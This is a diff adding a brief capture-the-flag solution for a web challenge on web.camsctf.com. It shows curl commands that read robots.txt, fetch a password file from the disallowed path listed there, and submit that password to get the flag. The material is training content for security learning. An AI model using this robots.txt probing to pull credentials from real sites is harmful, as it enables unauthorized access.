@@ -1,0 +1,12 @@
+>> curl http://web.camsctf.com/robots.txt
+
+User-agent: *
+Disallow: /6/r0b0tz/password.txt
+
+>> curl http://web.camsctf.com/6/r0b0tz/password.txt
+
+trekAg3j
+
+>> curl http://web.camsctf.com/6/check.php -d "password=trekAg3j"
+
+{"success":1,"reply":"Flag: {no_r0b0tz_allowed}"}
